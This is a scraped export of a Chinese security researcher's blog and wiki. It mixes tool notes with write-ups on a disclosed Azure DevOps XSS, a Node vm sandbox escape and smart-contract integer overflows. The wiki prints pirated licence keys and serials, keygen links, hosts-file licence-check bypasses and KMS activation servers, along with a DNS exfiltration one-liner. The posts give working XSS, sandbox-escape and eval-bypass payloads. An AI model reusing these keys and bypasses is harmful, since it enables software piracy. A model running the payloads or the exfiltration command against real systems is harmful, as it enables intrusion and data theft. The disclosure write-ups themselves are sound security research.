批量替换字符串mac下强制备份，所以需要 sed -i “”grep -l ‘from lib’ -r . | xargs sed -i “” “s/from lib/from libs/g” 代码高亮复制到PPT里pip install Pygmentspygmentize -f rtf -O style=paraiso-dark -l html code.html | pbcopy Wireshark对HTTPS数据的解密以windows系统+Chrome浏览器为例，首先要导出浏览器存储的密钥，通过计算机属性——高级系统设置——环境变量，新建一个变量名“SSLKEYLOGFILE”的变量，变量值是导出的密钥具体文件地址。设置后可以通过Chrome浏览器打开任意一个HTTPS网址，此时查看变量值对应路径，已经生成sslkey.log。密钥成功导出到本地啦。现在可以将密钥应用到Wireshark了。具体路径如下：菜单栏Edit——Preferences——Protocols——SSL（注意，不论是SSL还是TLS这里都是SSL，没有单独的TLS选项），在(Pre)-Master-Secretlog filename中选择刚才设置的变量值。看到有HTTP了，之前都是TLSv1.2。同时，WireShark下面会有一个“Decrypted SSL data”即已解密的SSL Data的标签，点击之后你就可以如上图所示的看到已经解密的TLS数据包的相信信息了。 https://zhuanlan.zhihu.com/p/36669377 dns 传数据;ls -1 / | xargs -n 1 -I {} ping -c 1 {}.exp.5alt.me; pyinstaller可以编译成 osx 的 app osx 查看进程和开的端口lsof -n -P -i TCP -s TCP:LISTEN 查看 ssl 端口的证书openssl s_client -showcerts -connect taobao.com:443 &lt; /dev/null | openssl x509 -text | grep -A 1 “Subject Alternative Name” Win/Linux 自带程序执行命令https://cooolis.payloads.online/ mac 移动硬盘文件提示被占用find . | awk ‘{print “\\””$1”\\””}’ | xargs xattr -d com.apple.FinderInfofind . | awk ‘{print “\\””$1,$2”\\””}’ | xargs xattr -d com.apple.FinderInfofind . | awk ‘{print “\\””$1,$2,$3”\\””}’ | xargs xattr -d com.apple.FinderInfo ffmpeg// 用 ffmpeg 把 mov 转成 720p 的 mp4；-an 参数表示去掉声音；-crf 23 设定画质，数字越大画质越低ffmpeg -i in.mov -vcodec libx264 -preset fast -crf 23 -vf “scale=-1:720” -an out.mp4 // 合并两个视频：ffmpeg.exe -i “1.mp4” -i “2.mp4” -filter_complex “[0:0] [0:1] [1:0] [1:1] concat=n=2:v=1:a=1 [v] [a]” -map “[v]” -map “[a]” out.mp4// 如果需要合并更多视频，只需将“concat=n=2”中的 2 改为 相应数字即可 // 便于在微信内传播的低码率视频编码参数：ffmpeg -i “in.mp4” -vcodec libx264 -b:v 128k -minrate 100k -maxrate 200k -preset fast -y -vf “scale=-1:360” -acodec aac -ab 36k 360p.mp4 // 切出视频中指定时间的一段。S和E的单位是秒MP4Box -split-chunk S:E foo.mp4 // 合并视频MP4Box -add video1.mp4 -cat video2.mp4 -cat video3.mp4 -add audio1.aac -cat audio2.aac -cat audio3.aac -new muxed.mp4 // 四路输入画面田字形拼接ffmpeg -i in1.mp4 -i in2.mp4 -i in3.mp4 -i in4.mp4 -filter_complex “[0:v]pad=iw2:ih2[a];[a][1:v]overlay=w[b];[b][2:v]overlay=0:h[c];[c][3:v]overlay=w:h” out.mp4 // 画中画ffmpeg -i small.mp4 -i big.mp4 -filter_complex “[1:v]scale=w=176:h=144:force_original_aspect_ratio=decrease[ckout];[0:v][ckout]overlay=x=W-w-10:y=0[out]” -map “[out]” -movflags faststart b.mp4 // 视频前加黑帧ffmpeg -i 1.mp4 -vf trim=0:0.1,geq=0:128:128 -af atrim=0:0.1,volume=0 -video_track_timescale 600 3sec.mp4ffmpeg -i 1.mp4 -c copy -video_track_timescale 600 full600.mp4ffmpeg -f concat -i 1.txt -c copy merged.mp4ffmpeg -i merged.mp4 -vcodec libx264 -an out.mp4 cat 1.txtfile 3sec.mp4file dingding.mp4"},{"title":"一些常用工具整理","date":"2017-11-02T16:00:00.000Z","updated":"2019-08-16T04:24:28.942Z","comments":true,"path":"wiki/机器学习.html","permalink":"http://5alt.me/wiki/机器学习.html","excerpt":"","text":"机器学习笔记https://github.com/lcatro/Machine-Learning-Notehttps://www.gitbook.com/book/wizardforcel/dm-algo-top10http://blog.csdn.net/l691899397/article/details/52240421http://blog.topspeedsnail.com/archives/10858http://www.cnblogs.com/subconscious/p/5058741.html tensorflowhttps://www.gitbook.com/book/hawkuu/headfirst-tensorflow/details 机器学习算法 cheat-sheethttps://docs.microsoft.com/zh-cn/azure/machine-learning/studio/algorithm-cheat-sheethttps://github.com/kailashahirwar/cheatsheets-aihttp://www.lauradhamilton.com/machine-learning-algorithm-cheat-sheethttp://scikit-learn.org/stable/tutorial/machine_learning_map/ 验证码https://github.com/nladuo/captcha-breakhttps://github.com/luyishisi/Anti-Anti-Spider"},{"title":"常用工具","date":"2019-05-28T16:00:00.000Z","updated":"2019-08-16T04:24:28.942Z","comments":true,"path":"wiki/日常工具.html","permalink":"http://5alt.me/wiki/日常工具.html","excerpt":"","text":"在线 PShttps://www.photopea.com/ 电影https://www.lumendatabase.org各大公司会给谷歌发DMCA要求移除盗版电影下载，然后这些律师函可以在 (link: https://www.lumendatabase.org) lumendatabase.org 查，于是去这里搜电影就能找到可以信赖的官方认证过的下载地址 http://pianyuan.la/表情图片生成https://imgflip.com/memetemplates 屏幕录像https://www.screentogif.com/?l=zh_cn 暗网搜索https://ahmia.fi/https://darksearch.io/"},{"title":"装机常用软件","date":"2017-07-13T16:00:00.000Z","updated":"2019-08-20T02:59:29.253Z","comments":true,"path":"wiki/装机.html","permalink":"http://5alt.me/wiki/装机.html","excerpt":"","text":"osx xtrafinder GoAgentX Flux VSCode Mounty Caffeine Dash zsh&amp;iTerm2 homebrew aria2gui pyenv GithubDesktop 播放器iina java 微信防撤回 显示预设应用程序 盗版软件下载 http://xclient.info/ brew install binutils 安装greadelf、gobjdump等brew instal coreutils launchrocket (Mojave 不能用了)管理brew安装的服务 123brew cask install launchrocketbrew tap homebrew/phpbrew isntall php72 配置文件 /usr/local/etc/ https://github.com/jimbojsb/launchrocket totalfinder12License Name: Kevin KelleyLicense Key: GAWAE-FBZK3-X4M62-5L9UJ-JLGUL-A6LCG-MBLQT-S9HQC-CRN99-JC7GB-FRFDZ-WCDYZ-DFPRA-5LD2R-CLLM Jitouch注册码12345678Email: jitouch@special[k].orgSerial: 154cdeffb9e82931e56fe3b4debd2ffd0c041626Email: neobetas@apple.comSerial: e8bbeaa5b6e545bc583654f23fe7552ce7a8948bEmail: minamoto@core.comSerial: 508f41943a5800e80da46293485b1b4575e8e4d8 010editor 8.0https://github.com/x0r19x91/010-Editor-k3yg3n keygen 12name：www.baqima.compassword：003F-0F9C-8167-44A1 本地搭建http服务器绕过网络验证修改hosts文件把www.sweetscape.com绑定到127.0.0.1，使http://127.0.0.1/cgibin/010editor_check_license_9b.php返回&lt;ss&gt;valid&lt;/ss&gt;。 dockerdocker image prune -fa 清理docker 词典https://github.com/jjgod/mac-dictionary-kithttp://download.huzheng.org/zh_CN/https://sites.google.com/site/gtonguedict/home/stardict-dictionaries sublime text 3加入hosts123127.0.0.1 license.sublimehq.com127.0.0.1 45.55.255.55127.0.0.1 45.55.41.223 http://appnee.com/sublime-text-3-universal-license-keys-collection-for-win-mac-linux/https://gist.github.com/angrycoffeemonster/4f05896d233baf6bd9b0894e30b5fa63 GoodSyncH8J-RDP-XMX-3YC 插件 Package Control html-css-js prettify ConvertToUTF8 Bracket Highlighter Alfred https://github.com/LeEnno/alfred-terminalfinder https://github.com/5alt/alfred2-hash Dash https://github.com/oott123/alfred-clipboard-ocr https://github.com/stve/alfred-ipaddress https://github.com/IvanChou/Trace.alfredworkflow http://www.packal.org/workflow/hide-desktop https://github.com/xiaohuanshu/alfred-brew-services/releases 和谐版的Alfred 3 在每次开机后，都会提示“是否允许访问通讯录”的弹窗sudo codesign -f -d -s - /Applications/Alfred\\ 3.app/Contents/Frameworks/Alfred\\ Framework.framework/Versions/A/Alfred\\ Framework Navicathttps://github.com/DoubleLabyrinth/navicat-keygen/blob/windows/README.zh-CN.md 三指拖移https://support.apple.com/zh-cn/HT204609 MAC应用无法打开或文件损坏的处理方法（xxx.app已损坏,打不开.你应该将它移到废纸篓）sudo spctl –master-disable 触发角关闭显示器选取苹果菜单 &gt;“系统偏好设置”，点按“桌面与屏幕保护程序”，然后点按“屏幕保护程序”。点按“触发角”。 finder 设置开启新 Finder 窗口时打开 home 目录显示所有文件扩展名关闭更改扩展名之前警告 vscode 单步调试快捷键和mac显示桌面的快捷键冲突Go to System Preferences -&gt; Keyboard -&gt; ShortcutsUncheck the “Show Desktop F11” option 右键打开方式中有重复/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -kill -r -domain local\\ -domain system -domain user 默认 sublime 打开文本文件defaults write com.apple.LaunchServices LSHandlers -array-add &#39;{LSHandlerContentType=public.plain-text;LSHandlerRoleAll=com.sublimetext.3;}&#39; zshrc1234567891011alias httpd=&quot;python -m SimpleHTTPServer&quot;alias py=&quot;python&quot;alias ftpd=&quot;python -m pyftpdlib&quot;alias subl=&quot;/Applications/Sublime\\ Text.app/Contents/SharedSupport/bin/subl&quot;# If you haven&apos;t created alias for Chrome yet, you could set it on MacOS like that:# For Chromealias chrome=&quot;/Applications/Google\\ Chrome.app/Contents/MacOS/Google\\ Chrome&quot;# For Chrome Canaryalias chrome-canary=&quot;/Applications/Google\\ Chrome\\ Canary.app/Contents/MacOS/Google\\ Chrome\\ Canary&quot;# For Chromiumalias chromium=&quot;/Applications/Chromium.app/Contents/MacOS/Chromium&quot; zsh 插件plugins=(git zsh-autosuggestions autojump zsh-completions zsh-syntax-highlighting) tmux1234567891011121314151617181920212223242526272829303132333435363738394041424344454647# 基础设置set -g default-terminal &quot;screen-256color&quot;set -g display-time 3000set -g escape-time 0set -g history-limit 65535set -g base-index 1set -g pane-base-index 1# bind a reload keybind r source-file ~/.tmux.conf ; display-message &quot;Config reloaded..&quot;# 前缀绑定 (Ctrl+a)unbind C-bset -g prefix C-a# 分割窗口unbind &apos;&quot;&apos;bind - splitw -vunbind %bind | splitw -h# 状态栏# 颜色set -g status-bg blackset -g status-fg white# 对齐方式set-option -g status-justify centre# 左下角set-option -g status-left &apos;#[bg=black,fg=green][#[fg=cyan]#S#[fg=green]]&apos;set-option -g status-left-length 20# 窗口列表setw -g automatic-rename onset-window-option -g window-status-format &apos;#[dim]#I:#[default]#W#[fg=grey,dim]&apos;set-window-option -g window-status-current-format &apos;#[fg=cyan,bold]#I#[fg=blue]:#[fg=cyan]#W#[fg=dim]&apos;# 右下角set -g status-right &apos;#[fg=green][#[fg=cyan]%Y-%m-%d#[fg=green]]&apos; # Use vim keybindings in copy modesetw -g mode-keys vi# 启用鼠标(Tmux v2.1)set -g mouse on ida 7.0https://github.com/fjh658/IDA7.0_SPhttp://iosre.com/t/ida-mojave-macos/12943 浏览器chrome EditThisCookie Proxy SwitchyOmega Tampermonkey Adblock Plus YAAW for Chrome ghostery隐私保护 github 辅助 百度盘下载 toby set-character-encoding firefox JavaScript Deobfuscator Hackbar EditThisCookie ghostery Tampermonkey Proxy SwitchyOmega Modify Response Headers Modify Headers windows bandizip解压缩 Re-Loader Activator 激活工具 listary 虚拟桌面 激活win1012345slmgr.vbs /upkslmgr /ipk W269N-WFGWX-YVC9B-4J6C9-T83GXslmgr /skms zh.us.toslmgr /ato office(需要vol或者转换成vol版)123cd &quot;C:\\Program Files (x86)\\Microsoft Office\\Office16&quot;cscript ospp.vbs /sethst:kms.03k.orgcscript ospp.vbs /act 其他burp 插件chunked-coding-converterfrida HTTPDecrypt"},{"title":"","date":"2019-08-16T04:24:28.942Z","updated":"2019-08-16T04:24:28.942Z","comments":true,"path":"wiki/硬件.html","permalink":"http://5alt.me/wiki/硬件.html","excerpt":"","text":"蓝牙蓝牙 BTLE scanhttps://github.com/evilsocket/bleah 蓝牙中间人https://github.com/DigitalSecurity/btlejuice iothttps://github.com/yaseng/iot-security-wiki"},{"title":"","date":"2019-08-16T04:24:28.942Z","updated":"2019-08-16T04:24:28.942Z","comments":true,"path":"wiki/编程.html","permalink":"http://5alt.me/wiki/编程.html","excerpt":"","text":"css练习https://flexboxfroggy.com/ 在线gcc生成汇编https://gcc.godbolt.org/ vue 多页面https://github.com/hungeroxc/vue-dachunchun-peizhi/"},{"title":"逆向常用工具整理","date":"2017-04-21T16:00:00.000Z","updated":"2019-08-16T04:24:28.943Z","comments":true,"path":"wiki/逆向.html","permalink":"http://5alt.me/wiki/逆向.html","excerpt":"","text":"模拟执行unicorn http://www.unicorn-engine.org/docs/tutorial.htmlidaemu https://github.com/36hours/idaemu 在ida中模拟执行VisUAL https://salmanarif.bitbucket.io/visual/index.html 在线汇编反汇编https://www.onlinedisassembler.com/odaweb/http://shell-storm.org/online/Online-Assembler-and-Disassembler/ libchttp://libcdb.com/ arm 指令学习https://azeria-labs.com/writing-arm-assembly-part-1/http://bobao.360.cn/learning/detail/4082.htmlthumb16 快速参考 http://infocenter.arm.com/help/topic/com.arm.doc.qrc0006ec/QRC0006_UAL16.pdf gdb web guihttps://github.com/cs01/gdbgui bindiffhttps://www.zynamics.com/software.html RFhttps://www.elttam.com.au/blog/intro-sdr-and-rf-analysis/ preeny把输入由socket重定向到stdin、禁用随机数等功能https://github.com/zardus/preeny 代码阅读https://github.com/OpenGrok/OpenGrok ida api安装 python27 x86 版本http://sark.readthedocs.io/https://www.hex-rays.com/products/ida/support/idapython_docs/ https://github.com/1111joe1111/ida_ea .nethttps://github.com/0xd4d/dnSpy patch 二进制文件https://github.com/lief-project/LIEF ida 直接读segment把elf header上e_shoff置为0xfffffff gdb 辅助https://github.com/pwndbg/pwndbg firmwarehttps://github.com/cinquemb/firmware-mod-kit-osxhttps://github.com/multiarch/qemu-user-statichttps://github.com/darkerego/mips-binarieshttps://github.com/andrew-d/static-binarieshttps://github.com/mzpqnxow/embedded-toolkithttps://github.com/maddiestone/IDAPythonEmbeddedToolkit golanghttps://gitlab.com/zaytsevgu/goutils mips ida f5https://github.com/avast-tl/retdec"}],"posts":[{"title":"How I alert(1) in Azure DevOps","slug":"xss-in-azure-devops","date":"2019-02-25T16:00:00.000Z","updated":"2019-08-20T02:56:08.034Z","comments":true,"path":"2019/02/xss-in-azure-devops/","link":"","permalink":"http://5alt.me/2019/02/xss-in-azure-devops/","excerpt":"Microsoft have launched a new bounty program targeting to the Azure DevOps. A new program is always easier for bug hunting. Let’s go for it! Our target is https://dev.azure.com , which is a git web server implemented by Microsoft. I found a XSS bug in the markdown editor. When creating a pull request, people can add some comments using markdown. Some feature is not well escaped by the markdown render, which leads to XSS.","text":"Microsoft have launched a new bounty program targeting to the Azure DevOps. A new program is always easier for bug hunting. Let’s go for it! Our target is https://dev.azure.com , which is a git web server implemented by Microsoft. I found a XSS bug in the markdown editor. When creating a pull request, people can add some comments using markdown. Some feature is not well escaped by the markdown render, which leads to XSS.I just copy &amp; paste a huge collection of XSS payloads provided by @ZephrFish, browser redirects me to a strange url. I tried to find the minimum payload, and after lots of try, I found if I put html tags in two $ and a % must also appear there, the html tags would magically be rendered in the output as it is! A sample payload is as follows. 1$%&lt;img src=1&gt;$ I tried to use img’s onerror action to triger XSS, nothing happened. I saw following errors in the chrome’s console. 1?_a=overview:1 Refused to execute inline event handler because it violates the following Content Security Policy directive: “script-src ‘unsafe-inline’ .visualstudio.com .dev.azure.com dev.azure.com https://cdn.vsassets.io https://vsassetscdn.azure.cn https://ms.gallery.vsassets.io https://ms.gallerycdn.vsassets.io https://ms.gallerycdn.azure.cn .ensighten.com .microsoft.com *.google-analytics.com ‘nonce-JNv3ZUluxXSBwNijHMtlKg==’”. Note that ‘unsafe-inline’ is ignored if either a hash or nonce value is present in the source list. Aha, it is blocked by CSP. ‘unsafe-inline’ is ignored if either a hash or nonce value is present in the source list. And when I tried to use &lt;script&gt;alert(1)&lt;/script&gt;, it said it was blocked because of unsafe-eval. OK, as dev.azure.com itself is whitelisted, I choose to point script tag’s src to a repo file which contains my payload. WTF??? It seems script tag is hooked by a frontend framework. I need to either find some way to bypass the CSP, or bypass the hook. I get the full CSP below. content-security-policy: default-src &#39;none&#39;; font-src *.visualstudio.com *.dev.azure.com dev.azure.com *.vsassets.io vsassetscdn.azure.cn ms.gallery.vsassets.io ms.gallerycdn.vsassets.io ms.gallerycdn.azure.cn *.microsoft.com *.sharepointonline.com; style-src &#39;unsafe-inline&#39; *.visualstudio.com *.dev.azure.com dev.azure.com cdn.vsassets.io vsassetscdn.azure.cn ms.gallery.vsassets.io ms.gallerycdn.vsassets.io ms.gallerycdn.azure.cn; connect-src *.visualstudio.com wss://*.visualstudio.com *.dev.azure.com dev.azure.com wss://*.dev.azure.com wss://dev.azure.com *.vsassets.io vsassetscdn.azure.cn ms.gallery.vsassets.io ms.gallerycdn.vsassets.io ms.gallerycdn.azure.cn *.blob.core.windows.net; img-src http: https: blob: data:; script-src &#39;unsafe-inline&#39; *.visualstudio.com *.dev.azure.com dev.azure.com https://cdn.vsassets.io https://vsassetscdn.azure.cn https://ms.gallery.vsassets.io https://ms.gallerycdn.vsassets.io https://ms.gallerycdn.azure.cn *.ensighten.com *.microsoft.com *.google-analytics.com &#39;nonce-BByveBAMp0eRn6Ll29C7Lw==&#39;; child-src * blob: tfs:; frame-src * blob: tfs:; media-src http: https:; frame-src * blob: tfs:; caught my eye. I can use iframe to isolate the hook for script tag! The final payload is123$&lt;iframe srcdoc=\"&lt;script src='https://dev.azure.com/md5_salt/deadbeef-1337-1337-1337-1337/_apis/git/repositories/deadbeef-1337-1337-1337-1337/Items?path=%2F1.js&amp;versionDescriptor%5BversionOptions%5D=0&amp;versionDescriptor%5BversionType%5D=0&amp;versionDescriptor%5Bversion%5D=master&amp;download=true&amp;resolveLfs=true&amp;%24format=octetStream&amp;api-version=5.0-preview.1'&gt;&lt;/script&gt;\"&gt;&lt;/iframe&gt;$ And finally the alert box popped up! XD Timeline: 01/19/2019 reported to Microsoft 01/25/2019 Microsoft confirmed the issue 02/06/2019 CVE-2019-0742 is assigned and acknowledged; ask for disclosing the details (already fixed) 02/07/2019 Microsoft agreed for disclosing after fix 02/26/2019 publicly disclosed","categories":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}],"tags":[],"keywords":[{"name":"web","slug":"web","permalink":"http://5alt.me/categories/web/"}]},{"title":"某开发工具沙箱绕过导致RCE","slug":"某开发工具沙箱绕过导致RCE","date":"2018-07-31T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2018/08/某开发工具沙箱绕过导致RCE/","link":"","permalink":"http://5alt.me/2018/08/某开发工具沙箱绕过导致RCE/","excerpt":"这是一个基于nw.js的开发的工具，有实时预览功能，预览的环境实际上是由预制的一个html渲染出来的，用户写的所有 js 代码也被自动封装成一个 module，通过script标签的方式引入。最终，用户的代码会在一个沙箱环境中被require进来，然后执行。 比如123&lt;script&gt;some code&lt;/script&gt;&lt;script src=\"your_code_file.js\"&gt;&lt;/script&gt;&lt;script&gt;require(\"your_code_file.js\")&lt;/script&gt; your_code_file.js 的内容例如 123define(\"your_code_file.js\", function(require, module, exports, process)&#123; \"use strict\"; // your original code&#125;); 其中define语句是工具自动生成的。 工具会在之前的处理逻辑里把global变量以及require函数重写，导致不能直接调用nodejs中原本的require函数。处理后的require函数无法获取到child_process模块。","text":"这是一个基于nw.js的开发的工具，有实时预览功能，预览的环境实际上是由预制的一个html渲染出来的，用户写的所有 js 代码也被自动封装成一个 module，通过script标签的方式引入。最终，用户的代码会在一个沙箱环境中被require进来，然后执行。 比如123&lt;script&gt;some code&lt;/script&gt;&lt;script src=\"your_code_file.js\"&gt;&lt;/script&gt;&lt;script&gt;require(\"your_code_file.js\")&lt;/script&gt; your_code_file.js 的内容例如 123define(\"your_code_file.js\", function(require, module, exports, process)&#123; \"use strict\"; // your original code&#125;); 其中define语句是工具自动生成的。 工具会在之前的处理逻辑里把global变量以及require函数重写，导致不能直接调用nodejs中原本的require函数。处理后的require函数无法获取到child_process模块。在这种情况下，我们需要知道有哪些变量可以使用。通过打印出下列变量，我们就可以对当前环境的状况有一定的了解。 arguments this new.target window parent top navigator location name global self 可以发现，可以用self、window、top等方式获取真正的global变量，其中我们发现了nodejs原版的require函数被存在了一个叫做__noderequire的变量中，直接用它来调用child_process即可命令执行。 几个版本之后发现用了 nodejs 自带的vm模块作为沙箱。不过这个已经早已被证实是不安全的。在另一个 nodejs 的沙箱模块vm2里甚至直接给出了绕过代码。更多的一些姿势可以参考在vm2模块issue里的一些讨论。 12const vm = require('vm');vm.runInNewContext('this.constructor.constructor(\"return process\")().mainModule.require(\"child_process\").spawn(\"/Applications/Calculator.app/Contents/MacOS/Calculator\")'); 绕过的思路很简单，找到一个不在沙箱的Context里创建的但是能在沙箱里访问到的变量，从这个变量的属性指针里找出沙箱外的可以执行代码方法，调用即可。在上述代码里，this的创建其实就是在沙箱外的。this.constructor为Object() { [native code] }，this.constructor.constructor为Function() { [native code] }。这样，通过this.constructor.constructor可以获取沙箱外的Function，即可以用来在沙箱外执行任意代码。其中process.mainModule里有 nodejs 中的require函数，可以用来执行任意命令。 解决这个问题需要处理Object.prototype.constructor到沙箱外面Function的连接，以及在沙箱内重建输入数据。 在接下来的版本迭代中，似乎 nodejs 被禁止使用了。 假如 nodejs 没有被禁用，程序使用了较为安全的沙箱vm2，是不是就没有风险了呢？这里还有一个 osx 下面的绕过方式。 我们回顾用户脚本被加载的过程，是将用户的脚本以 script 标签 src 属性的方式加载到页面中。由于 js 文件会被封装成一个 module，里面的代码不会被立即执行。如果用户的脚本文件名称里带有双引号&quot;，即可闭合 src 属性，导致加载其他的文件，如果直接在这个文件中执行 js 代码，此时的执行环节就在沙箱外，可以直接 RCE。 比如我们创建一个 js 文件名为evil.json&quot; &quot;.js。再创建一个名为evil.json的 json 文件。evil.json里有我们恶意的payload，因为不是js后缀，所以里面的内容不会被处理。这样经过渲染，页面变成了如下所示。12&lt;script&gt;some code&lt;/script&gt;&lt;script src=\"evil.json\" \".js\"&gt;&lt;/script&gt; evil.json里的恶意代码被执行。 由于在windows环境中无法创建带有双引号的文件名的文件，导致此方法无法在windows下使用。 既然谈到了沙箱，再抄一段禁止eval的绕过方法吧，来源见参考文献。 eval=undefined可以用Function(payload)()绕过。Function.prototype.constructo=rundefined可以用Object.constructor(payload)()绕过。Object.getPrototypeOf=undefined可以用Reflect.construct(Function, [payload])()绕过。Function=undefined可以用(function*(){}).constructor(payload)().next()绕过。 参考文献https://github.com/patriksimek/vm2/issues/32https://docs.google.com/presentation/d/1bYFbCtHGimDmqdwE6Um0WZ7O97eWAK-N1qndqrv8niA/pub","categories":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"http://5alt.me/categories/奇技淫巧/"}],"tags":[],"keywords":[{"name":"奇技淫巧","slug":"奇技淫巧","permalink":"http://5alt.me/categories/奇技淫巧/"}]},{"title":"批量扫描智能合约中的整数溢出问题","slug":"批量扫描智能合约中的整数溢出问题","date":"2018-04-25T16:00:00.000Z","updated":"2019-08-16T04:24:28.787Z","comments":true,"path":"2018/04/批量扫描智能合约中的整数溢出问题/","link":"","permalink":"http://5alt.me/2018/04/批量扫描智能合约中的整数溢出问题/","excerpt":"最近币圈接连出了两个大漏洞，BEC和SMT这两种智能合约存在整数溢出问题，导致可以凭空造币。目前已经出了几篇分析的文章，我也在这里蹭一波热点，说一些其他的东西。 在说其他的之前，还是先提一遍原理。 根据Solidity 的文档，我们可以看到，在这个语言里的整数分为int(有符号)/uint(无符号)两种。变量步长为8，支持从uint8/int8到uint256/int256。uint和int默认代表uint256和int256。对整数的运算是会有溢出问题的。其他更详细的原理分析可以参考这篇文章。","text":"最近币圈接连出了两个大漏洞，BEC和SMT这两种智能合约存在整数溢出问题，导致可以凭空造币。目前已经出了几篇分析的文章，我也在这里蹭一波热点，说一些其他的东西。 在说其他的之前，还是先提一遍原理。 根据Solidity 的文档，我们可以看到，在这个语言里的整数分为int(有符号)/uint(无符号)两种。变量步长为8，支持从uint8/int8到uint256/int256。uint和int默认代表uint256和int256。对整数的运算是会有溢出问题的。其他更详细的原理分析可以参考这篇文章。首先看 BEC 的代码。完整代码点这里。更加详细的分析点这里。1234567891011121314// BECfunction batchTransfer(address[] _receivers, uint256 _value) public whenNotPaused returns (bool) &#123; uint cnt = _receivers.length; uint256 amount = uint256(cnt) * _value; require(cnt &gt; 0 &amp;&amp; cnt &lt;= 20); require(_value &gt; 0 &amp;&amp; balances[msg.sender] &gt;= amount); balances[msg.sender] = balances[msg.sender].sub(amount); for (uint i = 0; i &lt; cnt; i++) &#123; balances[_receivers[i]] = balances[_receivers[i]].add(_value); Transfer(msg.sender, _receivers[i], _value); &#125; return true;&#125; 这个函数接收两个参数，一个是address的数组，一个是uint256。控制输入地址的数量cnt，填写一个大的_value，使uint256 amount = uint256(cnt) * _value;计算溢出为比较小的值，能过balances[msg.sender] &gt;= amount判断，即可触发bug。当然，这里的问题被归结为没有使用SafeMath做乘法。 再看 SMT 的代码。完整代码点这里。123456789101112131415161718192021function transferProxy(address _from, address _to, uint256 _value, uint256 _feeUgt, uint8 _v,bytes32 _r, bytes32 _s) returns (bool)&#123; if(balances[_from] &lt; _feeUgt + _value) throw; uint256 nonce = nonces[_from]; bytes32 h = sha3(_from,_to,_value,_feeUgt,nonce); if(_from != ecrecover(h,_v,_r,_s)) throw; if(balances[_to] + _value &lt; balances[_to] || balances[msg.sender] + _feeUgt &lt; balances[msg.sender]) throw; balances[_to] += _value; Transfer(_from, _to, _value); balances[msg.sender] += _feeUgt; Transfer(_from, msg.sender, _feeUgt); balances[_from] -= _value + _feeUgt; nonces[_from] = nonce + 1; return true;&#125; 这个函数问题出现在_value和_feeUgt这两个变量上。需要使balances[_from] &lt; _feeUgt + _value，balances[_to] + _value &lt; balances[_to]，balances[msg.sender] + _feeUgt &lt; balances[msg.sender])不成立即可。通过溢出_feeUgt + _value很容易做到。 现在问题来了，我知道了漏洞的原理，可世界上有那么多智能合约，应该怎么批量扫描这类漏洞呢。我们重新看一遍上面两个漏洞。漏洞的原因是整数溢出，漏洞的特征是函数有两个以上可以控制的参与运算和判断的数字。如果只能传入一个数字参与运算的话，一般来说是无法触发整数溢出的。BEC 的问题函数除了_value之外还有个隐藏参数是_receivers.length。SMT 就是明显的传入了两个参数_value和_feeUgt。因此要批量扫描这类问题，只需要找到接收数组或者多个参数的transfer函数即可。 在4月25日下午我们写了爬虫，爬取了https://etherscan.io/tokens上列出的开源的知名智能合约代码。并从火币网爬取了正在交易的 ERC20 代币，下载其源码。我们在下载到的368个智能合约代码中批量查找以上特征，没有发现受到影响的代币。 在4月25日傍晚看到微信公众号上有文章称发现多个ERC20智能合约遭受proxyOverflow漏洞影响。我们发现，该文章中列出的智能合约并不是知名的智能合约，有一部分和一些知名智能合约重名（通过智能合约的地址就能区分），有些甚至已经很久不活跃了。这些智能合约的特点是都使用了transferProxy这个有漏洞的函数。 当然，智能合约的问题不止是整数溢出问题，智能合约一旦出问题就不能修补，直接死亡。不过目前来看，智能合约代码量少，互相借鉴程度高，只要抄袭了热门项目的代码，出现问题的概率还是很低的。 参考文献http://solidity.readthedocs.iohttps://www.anquanke.com/post/id/106382https://paper.seebug.org/582/https://mp.weixin.qq.com/s/L0gn5zXPXKcdmzygpoM_Rg","categories":[{"name":"以太坊","slug":"以太坊","permalink":"http://5alt.me/categories/以太坊/"}],"tags":[],"keywords":[{"name":"以太坊","slug":"以太坊","permalink":"http://5alt.me/categories/以太坊/"}]},{"title":"weblogic反序列化漏洞分析与调试","slug":"weblogic反序列化漏洞分析与调试","date":"2018-04-19T16:00:00.000Z","updated":"2019-08-16T04:24:28.786Z","comments":true,"path":"2018/04/weblogic反序列化漏洞分析与调试/","link":"","permalink":"http://5alt.me/2018/04/weblogic反序列化漏洞分析与调试/","excerpt":"安装 weblogic官网下载安装下载地址 http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html ，需要注册账号。 安装完之后会弹出向导配置，在 Mac 上安装报错java.io.IOException: Too many open files，需要执行以下命令。12sudo sysctl -w kern.maxfiles=20480sudo sysctl -w kern.maxfilesperproc=18000","text":"安装 weblogic官网下载安装下载地址 http://www.oracle.com/technetwork/middleware/weblogic/downloads/index.html ，需要注册账号。 安装完之后会弹出向导配置，在 Mac 上安装报错java.io.IOException: Too many open files，需要执行以下命令。12sudo sysctl -w kern.maxfiles=20480sudo sysctl -w kern.maxfilesperproc=18000 安装完毕版本是 12.2.1.3.0。 参考https://superuser.com/questions/433746/is-there-a-fix-for-the-too-many-open-files-in-system-error-on-os-x-10-7-1 docker 安装直接用 Vulhub 的这个镜像 https://github.com/vulhub/vulhub/tree/master/weblogic/CVE-2017-10271 。安装完毕版本是 10.3.6.0。 调试 weblogic在 /Oracle/Middleware/Oracle_Home/user_projects/domains/base_domain/bin/setDomainEnv.sh 里使local_debug为true就好了。123456export local_debug=&quot;true&quot;if [ &quot;$&#123;local_debug&#125;&quot; = &quot;true&quot; ] ; then JAVA_DEBUG=&quot;-Xdebug -Xnoagent -Xrunjdwp:transport=dt_socket,address=$&#123;DEBUG_PORT&#125;,server=y,suspend=n -Djava.compiler=NONE&quot; export JAVA_DEBUG JAVA_OPTIONS=&quot;$&#123;JAVA_OPTIONS&#125; $&#123;enableHotswapFlag&#125; $&#123;debugpatchAgent&#125; -ea -da:com.bea... -da:javelin... -da:weblogic... -ea:com.bea.wli... -ea:com.bea.broker... -ea:com.bea.sbconsole...&quot; export JAVA_OPTIONS 运行startWebLogic.sh启动服务。 在 IDEA 里新建一个 java 工程，在File-&gt;Project Structure里找到Libraries，添加Oracle/Middleware/Oracle_Home/wlserver/modules。然后新建一个Remote的Run/Debug Configurations，设置好端口号和搜索资源的 module。下好断点即可 debug。 感谢头师傅的指导。 从 CVE-2015-4852 看起CVE-2015-4852 是 java 反序列化问题引起重视并被大规模利用适合的 weblogic 